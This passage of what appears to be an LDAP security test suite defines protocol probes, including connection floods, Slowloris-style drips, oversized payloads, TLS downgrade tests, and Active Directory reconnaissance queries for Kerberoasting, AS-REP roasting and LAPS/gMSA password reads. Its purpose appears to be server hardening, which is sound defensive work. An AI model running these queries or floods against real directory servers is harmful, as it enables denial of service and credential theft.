        // Abandon has no response per RFC — verify connection still works
        ...bindActions('', ''),
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should silently ignore abandon of unknown ID',
  },

  {
    name: 'ldap-server-response-as-request',
    category: 'LD',
    description: 'Send a BindResponse (server→client message) to server',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        { type: 'send', data: pkt.buildBindResponse(1, 0, '', ''), label: 'BindResponseToServer' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should reject client sending server-type messages',
  },

  {
    name: 'ldap-pipelining',
    category: 'LD',
    description: 'Pipeline 5 requests without waiting for responses',
    side: 'client',
    actions: () => {
      resetMsgId();
      const bind = pkt.buildBindRequest(1, { dn: '', password: '' });
      const searches = [];
      for (let i = 2; i <= 6; i++) {
        searches.push(pkt.buildSearchRequest(i, {
          baseDN: '', scope: 0,
          filter: { type: 'present', attr: 'objectClass' }, attributes: ['namingContexts'],
        }));
      }
      const actions = [
        { type: 'send', data: bind, label: 'PipelineBind' },
      ];
      for (const s of searches) {
        actions.push({ type: 'send', data: s, label: 'PipelineSearch' });
      }
      // Collect all responses
      for (let i = 0; i < 6; i++) {
        actions.push({ type: 'recv', timeout: 5000, label: `Response-${i}` });
      }
      return actions;
    },
    expected: 'PASSED',
    expectedReason: 'Server should handle pipelined requests',
  },

  {
    name: 'ldap-double-bind',
    category: 'LD',
    description: 'Bind twice with different credentials on same connection',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...bindActions('cn=user1,dc=test,dc=com', 'pass1'),
        ...bindActions('cn=user2,dc=test,dc=com', 'pass2'),
        // Second bind should replace first auth context
        searchAction('dc=test,dc=com', SEARCH_SCOPE.baseObject,
          { type: 'present', attr: 'objectClass' }, ['dn']),
        { type: 'recv', timeout: 5000, label: 'SearchResults' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should reset auth context on rebind',
  },


  // ─────────────────────────────────────────────────────────────────────────────
  //  LE — Resource Exhaustion (high)
  // ─────────────────────────────────────────────────────────────────────────────

  {
    name: 'ldap-connection-flood-50',
    category: 'LE',
    description: 'Open 50 TCP connections with bind requests',
    side: 'client',
    connectionCount: 50,
    actions: () => {
      resetMsgId();
      return [
        ...bindActions('', ''),
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should handle or rate-limit connections',
  },

  {
    name: 'ldap-search-no-size-limit',
    category: 'LE',
    description: 'Search with sizeLimit=0 (unlimited) on base DN',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('dc=example,dc=com', SEARCH_SCOPE.wholeSubtree,
          { type: 'present', attr: 'objectClass' }, ['*'],
          { sizeLimit: 0, label: 'UnlimitedSearch' }),
        { type: 'recv', timeout: 30000, label: 'SearchResults' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should enforce its own size limits',
  },

  {
    name: 'ldap-search-huge-size-limit',
    category: 'LE',
    description: 'Search requesting 999999999 entries',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('dc=example,dc=com', SEARCH_SCOPE.wholeSubtree,
          { type: 'present', attr: 'objectClass' }, ['*'],
          { sizeLimit: 999999999, label: 'HugeSizeLimitSearch' }),
        { type: 'recv', timeout: 10000, label: 'SearchResults' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should cap sizeLimit to its configured max',
  },

  {
    name: 'ldap-paged-results-abuse',
    category: 'LE',
    description: 'Paged search with page size 1 — maximizes server state tracking',
    side: 'client',
    actions: () => {
      resetMsgId();
      // Build paged control: pageSize=1, cookie=""
      const pageSize = pkt.berInteger(1);
      const cookie = pkt.berOctetString(Buffer.alloc(0));
      const controlValue = pkt.berSequence(Buffer.concat([pageSize, cookie]));
      const control = pkt.berSequence(Buffer.concat([
        pkt.berOctetString(Buffer.from(LDAP_CONTROL.PagedResults)),
        pkt.berBoolean(true), // critical
        pkt.berOctetString(controlValue),
      ]));
      const controls = pkt.berContextTag(0, control);

      const msgId = nextMsgId();
      const searchReq = pkt.buildSearchRequest(msgId, {
        baseDN: 'dc=example,dc=com', scope: 2,
        filter: { type: 'present', attr: 'objectClass' },
        attributes: ['cn'],
      });

      return [
        ...anonBindActions(),
        { type: 'send', data: searchReq, label: 'PagedSearch-Size1' },
        { type: 'recv', timeout: 5000, label: 'PagedResult1' },
        { type: 'recv', timeout: 5000, label: 'PagedResult2' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should handle minimal page size without resource leak',
  },

  {
    name: 'ldap-large-payload-10mb',
    category: 'LE',
    description: 'Send 10MB LDAP add request — memory exhaustion test',
    side: 'client',
    actions: () => {
      resetMsgId();
      const msgId = nextMsgId();
      // Build an Add request with a 10MB attribute value
      const largeValue = 'X'.repeat(10 * 1024 * 1024);
      return [
        ...anonBindActions(),
        { type: 'send', data: pkt.buildAddRequest(msgId, 'cn=big,dc=test,dc=com', {
          objectClass: ['top', 'person'],
          cn: ['big'],
          sn: ['test'],
          description: [largeValue],
        }), label: 'Add10MB' },
        { type: 'recv', timeout: 30000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should reject oversized payloads',
  },

  {
    name: 'ldap-rapid-search-100',
    category: 'LE',
    description: 'Send 100 search requests as fast as possible',
    side: 'client',
    actions: () => {
      resetMsgId();
      const actions = [...anonBindActions()];
      for (let i = 0; i < 100; i++) {
        const msgId = nextMsgId();
        actions.push({
          type: 'send',
          data: pkt.buildSearchRequest(msgId, {
            baseDN: '', scope: 0,
            filter: { type: 'present', attr: 'objectClass' },
            attributes: ['namingContexts'],
          }),
          label: `RapidSearch-${i}`,
        });
      }
      // Collect some responses
      for (let i = 0; i < 10; i++) {
        actions.push({ type: 'recv', timeout: 5000, label: `Response-${i}` });
      }
      return actions;
    },
    expected: 'PASSED',
    expectedReason: 'Server should handle burst of requests',
  },

  {
    name: 'ldap-slowloris-drip',
    category: 'LE',
    description: 'Slowloris-style — send bind request 1 byte per second',
    side: 'client',
    actions: () => {
      resetMsgId();
      const msg = pkt.buildBindRequest(1, { dn: '', password: '' });
      const actions = [];
      for (let i = 0; i < msg.length; i++) {
        actions.push({ type: 'send', data: msg.slice(i, i + 1), label: `Drip-${i}` });
        actions.push({ type: 'delay', ms: 1000 });
      }
      actions.push({ type: 'recv', timeout: 30000, label: 'Response' });
      return actions;
    },
    expected: 'PASSED',
    expectedReason: 'Server should timeout slow clients',
  },

  {
    name: 'ldap-attribute-star-all',
    category: 'LE',
    description: 'Search requesting all attributes (*) + operational (+)',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('dc=example,dc=com', SEARCH_SCOPE.baseObject,
          { type: 'present', attr: 'objectClass' }, ['*', '+']),
        { type: 'recv', timeout: 10000, label: 'SearchResults' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should return all attributes or limit response',
  },

  {
    name: 'ldap-many-attributes-request',
    category: 'LE',
    description: 'Search requesting 1000 different attribute names',
    side: 'client',
    actions: () => {
      resetMsgId();
      const attrs = [];
      for (let i = 0; i < 1000; i++) attrs.push(`attr${i}`);
      return [
        ...anonBindActions(),
        searchAction('dc=example,dc=com', SEARCH_SCOPE.baseObject,
          { type: 'present', attr: 'objectClass' }, attrs,
          { label: 'Search1000Attrs' }),
        { type: 'recv', timeout: 10000, label: 'SearchResults' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should handle many requested attributes',
  },


  // ─────────────────────────────────────────────────────────────────────────────
  //  LF — LDAPS/StartTLS Transport (critical)
  // ─────────────────────────────────────────────────────────────────────────────

  {
    name: 'ldap-starttls-upgrade',
    category: 'LF',
    description: 'StartTLS extended request then upgrade to TLS',
    side: 'client',
    actions: () => {
      resetMsgId();
      const msgId = nextMsgId();
      return [
        { type: 'send', data: pkt.buildExtendedRequest(msgId, LDAP_OID.StartTLS), label: 'StartTLS-Request' },
        { type: 'recv', timeout: 5000, label: 'StartTLS-Response' },
        { type: 'connect', mode: 'starttls-upgrade', label: 'TLS-Upgrade' },
        ...bindActions('cn=admin,dc=example,dc=com', 'password'),
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should support StartTLS upgrade',
  },

  {
    name: 'ldap-starttls-double',
    category: 'LF',
    description: 'Send StartTLS twice — second should fail',
    side: 'client',
    actions: () => {
      resetMsgId();
      const msgId1 = nextMsgId();
      const msgId2 = nextMsgId();
      return [
        { type: 'send', data: pkt.buildExtendedRequest(msgId1, LDAP_OID.StartTLS), label: 'StartTLS-1' },
        { type: 'recv', timeout: 5000, label: 'Response-1' },
        { type: 'connect', mode: 'starttls-upgrade', label: 'TLS-Upgrade' },
        { type: 'send', data: pkt.buildExtendedRequest(msgId2, LDAP_OID.StartTLS), label: 'StartTLS-2' },
        { type: 'recv', timeout: 5000, label: 'Response-2' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should reject second StartTLS (already encrypted)',
  },

  {
    name: 'ldap-starttls-with-pending-ops',
    category: 'LF',
    description: 'Send StartTLS while search is outstanding',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('dc=example,dc=com', SEARCH_SCOPE.wholeSubtree,
          { type: 'present', attr: 'objectClass' }, ['dn']),
        // Don't wait for search results — send StartTLS immediately
        { type: 'send', data: pkt.buildExtendedRequest(nextMsgId(), LDAP_OID.StartTLS), label: 'StartTLS-WithPending' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should reject StartTLS with pending operations per RFC 4511',
  },

  {
    name: 'ldap-ldaps-direct',
    category: 'LF',
    description: 'Direct LDAPS connection on port 636',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        { type: 'connect', mode: 'tls', port: 636, label: 'LDAPS-Connect' },
        ...bindActions('', ''),
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should accept direct LDAPS connections',
  },

  {
    name: 'ldap-plaintext-to-ldaps-port',
    category: 'LF',
    description: 'Send plain LDAP to LDAPS port 636 — no TLS',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        { type: 'connect', mode: 'plain', port: 636, label: 'PlainToLDAPS' },
        { type: 'send', data: pkt.buildBindRequest(1, { dn: '', password: '' }), label: 'PlainBind636' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should reject non-TLS data on LDAPS port',
  },

  {
    name: 'ldap-tls-downgrade-after-starttls',
    category: 'LF',
    description: 'After StartTLS, send plaintext LDAP (TLS downgrade attempt)',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        { type: 'send', data: pkt.buildExtendedRequest(nextMsgId(), LDAP_OID.StartTLS), label: 'StartTLS' },
        { type: 'recv', timeout: 5000, label: 'StartTLS-Response' },
        // Don't upgrade — send plaintext over what should be TLS
        { type: 'send', data: pkt.buildBindRequest(nextMsgId(), { dn: '', password: '' }), label: 'PlainAfterStartTLS' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should expect TLS after StartTLS response',
  },

  {
    name: 'ldap-starttls-garbage-tls',
    category: 'LF',
    description: 'StartTLS then send garbage instead of ClientHello',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        { type: 'send', data: pkt.buildExtendedRequest(nextMsgId(), LDAP_OID.StartTLS), label: 'StartTLS' },
        { type: 'recv', timeout: 5000, label: 'StartTLS-Response' },
        { type: 'send', data: pkt.buildGarbageMessage(128), label: 'GarbageClientHello' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should close connection on TLS negotiation failure',
  },

  {
    name: 'ldap-bind-before-starttls-confidentiality',
    category: 'LF',
    description: 'Attempt bind with credentials before StartTLS on plain port',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...bindActions('cn=admin,dc=example,dc=com', 'secretpassword'),
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Security audit: credentials should only travel over TLS',
  },


  // ─────────────────────────────────────────────────────────────────────────────
  //  LG — AD-Specific Attacks (critical)
  // ─────────────────────────────────────────────────────────────────────────────

  {
    name: 'ldap-ad-spn-enum',
    category: 'LG',
    description: 'Enumerate SPNs for Kerberoasting — (&(servicePrincipalName=*)(objectCategory=user))',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('dc=example,dc=com', SEARCH_SCOPE.wholeSubtree,
          { type: 'and', filters: [
            { type: 'present', attr: 'servicePrincipalName' },
            { type: 'eq', attr: 'objectCategory', value: 'person' },
          ]},
          ['sAMAccountName', 'servicePrincipalName', 'memberOf'],
          { label: 'SPN-Enumeration' }),
        { type: 'recv', timeout: 10000, label: 'SPNResults' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should return SPN entries if authorized, or restrict',
  },

  {
    name: 'ldap-ad-asrep-roast',
    category: 'LG',
    description: 'Find AS-REP roastable accounts — (userAccountControl:1.2.840.113556.1.4.803:=4194304)',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('dc=example,dc=com', SEARCH_SCOPE.wholeSubtree,
          { type: 'ext', rule: '1.2.840.113556.1.4.803', attr: 'userAccountControl', value: '4194304', dnAttributes: false },
          ['sAMAccountName', 'userAccountControl'],
          { label: 'ASREPRoast' }),
        { type: 'recv', timeout: 10000, label: 'Results' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should handle bitwise filter (DONT_REQ_PREAUTH)',
  },

  {
    name: 'ldap-ad-laps-password-read',
    category: 'LG',
    description: 'Attempt to read LAPS passwords — (ms-Mcs-AdmPwd=*)',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('dc=example,dc=com', SEARCH_SCOPE.wholeSubtree,
          { type: 'present', attr: 'ms-Mcs-AdmPwd' },
          ['cn', 'ms-Mcs-AdmPwd', 'ms-Mcs-AdmPwdExpirationTime'],
          { label: 'LAPS-Read' }),
        { type: 'recv', timeout: 10000, label: 'Results' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should restrict LAPS password access',
  },

  {
    name: 'ldap-ad-gmsa-password-read',
    category: 'LG',
    description: 'Attempt to read gMSA passwords — (objectClass=msDS-GroupManagedServiceAccount)',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('dc=example,dc=com', SEARCH_SCOPE.wholeSubtree,
          { type: 'eq', attr: 'objectClass', value: 'msDS-GroupManagedServiceAccount' },
          ['sAMAccountName', 'msDS-ManagedPassword', 'msDS-GroupMSAMembership'],
          { label: 'gMSA-Read' }),
        { type: 'recv', timeout: 10000, label: 'Results' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should restrict gMSA password access',
  },

  {
    name: 'ldap-ad-domain-admins-enum',
    category: 'LG',
    description: 'Enumerate Domain Admins group membership',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('dc=example,dc=com', SEARCH_SCOPE.wholeSubtree,
          { type: 'eq', attr: 'cn', value: 'Domain Admins' },
          ['member', 'cn', 'distinguishedName'],
          { label: 'DomainAdmins-Enum' }),
        { type: 'recv', timeout: 10000, label: 'Results' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should return membership info if authorized',
  },

  {
    name: 'ldap-ad-computer-accounts-enum',
    category: 'LG',
    description: 'Enumerate all computer accounts — (objectCategory=computer)',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('dc=example,dc=com', SEARCH_SCOPE.wholeSubtree,
          { type: 'eq', attr: 'objectCategory', value: 'computer' },
          ['cn', 'dNSHostName', 'operatingSystem', 'operatingSystemVersion'],
          { label: 'ComputerEnum' }),
        { type: 'recv', timeout: 10000, label: 'Results' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should return computer accounts if authorized',
  },

  {
    name: 'ldap-ad-gpo-enum',
    category: 'LG',
    description: 'Enumerate Group Policy Objects',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('cn=Policies,cn=System,dc=example,dc=com', SEARCH_SCOPE.wholeSubtree,
          { type: 'eq', attr: 'objectClass', value: 'groupPolicyContainer' },
          ['displayName', 'gPCFileSysPath', 'versionNumber'],
          { label: 'GPO-Enum' }),
        { type: 'recv', timeout: 10000, label: 'Results' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should return GPOs if authorized',
  },

  {
    name: 'ldap-ad-unconstrained-delegation',
    category: 'LG',
    description: 'Find unconstrained delegation — (userAccountControl:1.2.840.113556.1.4.803:=524288)',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('dc=example,dc=com', SEARCH_SCOPE.wholeSubtree,
          { type: 'ext', rule: '1.2.840.113556.1.4.803', attr: 'userAccountControl', value: '524288', dnAttributes: false },
          ['sAMAccountName', 'userAccountControl', 'servicePrincipalName'],
          { label: 'UnconstrainedDelegation' }),
        { type: 'recv', timeout: 10000, label: 'Results' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should return delegation accounts if authorized',
  },

  {
    name: 'ldap-ad-constrained-delegation',
    category: 'LG',
    description: 'Find constrained delegation — (msDS-AllowedToDelegateTo=*)',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('dc=example,dc=com', SEARCH_SCOPE.wholeSubtree,
          { type: 'present', attr: 'msDS-AllowedToDelegateTo' },
          ['sAMAccountName', 'msDS-AllowedToDelegateTo'],
          { label: 'ConstrainedDelegation' }),
        { type: 'recv', timeout: 10000, label: 'Results' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should return constrained delegation info if authorized',
  },

  {
    name: 'ldap-ad-password-policy',
    category: 'LG',
    description: 'Read domain password policy from default naming context',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('dc=example,dc=com', SEARCH_SCOPE.baseObject,
          { type: 'present', attr: 'objectClass' },
          ['minPwdLength', 'maxPwdAge', 'minPwdAge', 'pwdHistoryLength', 'lockoutThreshold', 'lockoutDuration'],
          { label: 'PasswordPolicy' }),
        { type: 'recv', timeout: 5000, label: 'Results' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should return password policy attributes',
  },

  {
    name: 'ldap-ad-schema-enum',
    category: 'LG',
    description: 'Enumerate AD schema — find all class definitions',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('cn=Schema,cn=Configuration,dc=example,dc=com', SEARCH_SCOPE.singleLevel,
          { type: 'eq', attr: 'objectClass', value: 'classSchema' },
          ['cn', 'lDAPDisplayName', 'adminDescription'],
          { sizeLimit: 20, label: 'SchemaEnum' }),
        { type: 'recv', timeout: 10000, label: 'Results' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should return schema entries if authorized',
  },

  {
    name: 'ldap-ad-tombstone-enum',
    category: 'LG',
    description: 'Enumerate deleted objects (tombstones) via ShowDeleted control',
    side: 'client',
    actions: () => {
      resetMsgId();
      // Note: control injection would need proper BuildLDAPMessage with controls
      // For now, search the Deleted Objects container
      return [
        ...anonBindActions(),
        searchAction('cn=Deleted Objects,dc=example,dc=com', SEARCH_SCOPE.singleLevel,
          { type: 'present', attr: 'objectClass' },
          ['cn', 'whenChanged', 'isDeleted'],
          { label: 'TombstoneEnum' }),
        { type: 'recv', timeout: 10000, label: 'Results' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should handle tombstone queries',
  },

  {
    name: 'ldap-ad-admincount-users',
    category: 'LG',
    description: 'Find privileged accounts — (adminCount=1)',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('dc=example,dc=com', SEARCH_SCOPE.wholeSubtree,
          { type: 'and', filters: [
            { type: 'eq', attr: 'adminCount', value: '1' },
            { type: 'eq', attr: 'objectCategory', value: 'person' },
          ]},
          ['sAMAccountName', 'adminCount', 'memberOf'],
          { label: 'AdminCountUsers' }),
        { type: 'recv', timeout: 10000, label: 'Results' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should return adminCount=1 users if authorized',
  },

  {
    name: 'ldap-ad-disabled-accounts',
    category: 'LG',
    description: 'Find disabled accounts — (userAccountControl:1.2.840.113556.1.4.803:=2)',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('dc=example,dc=com', SEARCH_SCOPE.wholeSubtree,
          { type: 'ext', rule: '1.2.840.113556.1.4.803', attr: 'userAccountControl', value: '2', dnAttributes: false },
          ['sAMAccountName', 'userAccountControl'],
          { label: 'DisabledAccounts' }),
        { type: 'recv', timeout: 10000, label: 'Results' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should return disabled accounts if authorized',
  },

  {
    name: 'ldap-ad-fastbind',
    category: 'LG',
    description: 'AD Fast Bind extended operation',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        { type: 'send', data: pkt.buildExtendedRequest(nextMsgId(), LDAP_OID.FastBind), label: 'FastBind' },
        { type: 'recv', timeout: 5000, label: 'Response' },
        ...bindActions('cn=admin,dc=example,dc=com', 'password'),
      ];
    },
    expected: 'PASSED',
    expectedReason: 'AD should support Fast Bind for credential validation only',
  },


  // ─────────────────────────────────────────────────────────────────────────────
  //  LH — Operation Fuzzing: Modify/Add/Delete (medium)
  // ─────────────────────────────────────────────────────────────────────────────

  {
    name: 'ldap-modify-missing-attr',
    category: 'LH',
    description: 'Modify request with empty attribute name',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        { type: 'send', data: pkt.buildModifyRequest(nextMsgId(), 'cn=test,dc=example,dc=com', [
          { operation: 'replace', attribute: '', values: ['value'] },
        ]), label: 'ModifyEmptyAttr' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should reject empty attribute name',
  },

  {
    name: 'ldap-modify-invalid-op-code',
    category: 'LH',
    description: 'Modify with invalid operation enumeration (99)',
    side: 'client',
    actions: () => {
      resetMsgId();
      // Manually build a modify with bad op code
      const dn = pkt.berOctetString(Buffer.from('cn=test,dc=example,dc=com'));
      const badOp = pkt.berEnumerated(99);
      const attrType = pkt.berOctetString(Buffer.from('description'));
      const attrVals = pkt.berSet(pkt.berOctetString(Buffer.from('value')));
      const attrValAssertion = pkt.berSequence(Buffer.concat([attrType, attrVals]));
      const modification = pkt.berSequence(Buffer.concat([badOp, attrValAssertion]));
      const modifications = pkt.berSequence(modification);
      const body = pkt.berApplication(6, Buffer.concat([dn, modifications]));
      const msg = pkt.buildLDAPMessage(nextMsgId(), body);

      return [
        ...anonBindActions(),
        { type: 'send', data: msg, label: 'ModifyBadOpCode' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should reject invalid modify operation code',
  },

  {
    name: 'ldap-modify-binary-value',
    category: 'LH',
    description: 'Modify with binary attribute value (random bytes)',
    side: 'client',
    actions: () => {
      resetMsgId();
      const binaryVal = crypto.randomBytes(256);
      return [
        ...anonBindActions(),
        { type: 'send', data: pkt.buildModifyRequest(nextMsgId(), 'cn=test,dc=example,dc=com', [
          { operation: 'replace', attribute: 'userCertificate;binary', values: [binaryVal.toString('binary')] },
        ]), label: 'ModifyBinaryValue' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should handle binary attribute values',
  },

  {
    name: 'ldap-add-minimal-entry',
    category: 'LH',
    description: 'Add entry with minimum required attributes',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        { type: 'send', data: pkt.buildAddRequest(nextMsgId(), 'cn=newuser,dc=example,dc=com', {
          objectClass: ['top', 'person'],
          cn: ['newuser'],
          sn: ['User'],
        }), label: 'AddMinimal' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should process add request (success or access denied)',
  },

  {
    name: 'ldap-add-no-objectclass',
    category: 'LH',
    description: 'Add entry without objectClass attribute',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        { type: 'send', data: pkt.buildAddRequest(nextMsgId(), 'cn=noclass,dc=example,dc=com', {
          cn: ['noclass'],
          sn: ['Test'],
        }), label: 'AddNoObjectClass' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should reject entry without objectClass',
  },

  {
    name: 'ldap-add-duplicate-dn',
    category: 'LH',
    description: 'Add entry with DN that already exists',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        { type: 'send', data: pkt.buildAddRequest(nextMsgId(), 'cn=Administrator,dc=example,dc=com', {
          objectClass: ['top', 'person'],
          cn: ['Administrator'],
          sn: ['Admin'],
        }), label: 'AddDuplicate' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should return entryAlreadyExists (68)',
  },

  {
    name: 'ldap-delete-entry',
    category: 'LH',
    description: 'Delete a leaf entry',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        { type: 'send', data: pkt.buildDelRequest(nextMsgId(), 'cn=testdelete,dc=example,dc=com'), label: 'DeleteEntry' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should delete or deny (noSuchObject/insufficientAccessRights)',
  },

  {
    name: 'ldap-delete-nonleaf',
    category: 'LH',
    description: 'Delete a non-leaf entry (has children)',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        { type: 'send', data: pkt.buildDelRequest(nextMsgId(), 'dc=example,dc=com'), label: 'DeleteNonLeaf' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should return notAllowedOnNonLeaf (66)',
  },

  {
    name: 'ldap-modifydn-rename',
    category: 'LH',
    description: 'ModifyDN — rename entry RDN',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        { type: 'send', data: pkt.buildModifyDNRequest(nextMsgId(), 'cn=oldname,dc=example,dc=com', 'cn=newname', true), label: 'ModifyDN-Rename' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should process rename or deny',
  },

  {
    name: 'ldap-compare-entry',
    category: 'LH',
    description: 'Compare operation — check if attribute has specific value',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        { type: 'send', data: pkt.buildCompareRequest(nextMsgId(), 'cn=admin,dc=example,dc=com', 'objectClass', 'person'), label: 'CompareRequest' },
        { type: 'recv', timeout: 5000, label: 'CompareResponse' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should return compareTrue or compareFalse',
  },


  // ─────────────────────────────────────────────────────────────────────────────
  //  LI — Extended Operations (medium)
  // ─────────────────────────────────────────────────────────────────────────────

  {
    name: 'ldap-extended-whoami',
    category: 'LI',
    description: 'WhoAmI extended request (OID 1.3.6.1.4.1.4203.1.11.3)',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        { type: 'send', data: pkt.buildExtendedRequest(nextMsgId(), LDAP_OID.WhoAmI), label: 'WhoAmI' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should return authorization identity',
  },

  {
    name: 'ldap-extended-password-modify',
    category: 'LI',
    description: 'PasswordModify extended request',
    side: 'client',
    actions: () => {
      resetMsgId();
      // PasswordModify value: SEQUENCE { userIdentity, oldPassword, newPassword }
      const value = pkt.berSequence(Buffer.concat([
        pkt.berContextTag(0, Buffer.from('cn=user,dc=example,dc=com'), false),
        pkt.berContextTag(1, Buffer.from('oldpass'), false),
        pkt.berContextTag(2, Buffer.from('newpass'), false),
      ]));
      return [
        ...anonBindActions(),
        { type: 'send', data: pkt.buildExtendedRequest(nextMsgId(), LDAP_OID.PasswordModify, value), label: 'PasswordModify' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should process password modify or deny',
  },

  {
    name: 'ldap-extended-cancel',
    category: 'LI',
    description: 'Cancel extended request for a non-existent operation',
    side: 'client',
    actions: () => {
      resetMsgId();
      // Cancel value: SEQUENCE { cancelID INTEGER }
      const value = pkt.berSequence(pkt.berInteger(99999));
      return [
        ...anonBindActions(),
        { type: 'send', data: pkt.buildExtendedRequest(nextMsgId(), LDAP_OID.Cancel, value), label: 'Cancel' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should return error for unknown cancel target',
  },

  {
    name: 'ldap-extended-unknown-oid',
    category: 'LI',
    description: 'Extended request with unknown/fake OID',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        { type: 'send', data: pkt.buildExtendedRequest(nextMsgId(), '1.3.6.1.4.1.99999.1.2.3'), label: 'UnknownOID' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should return protocolError or unwillingToPerform',
  },

  {
    name: 'ldap-extended-empty-oid',
    category: 'LI',
    description: 'Extended request with empty OID string',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
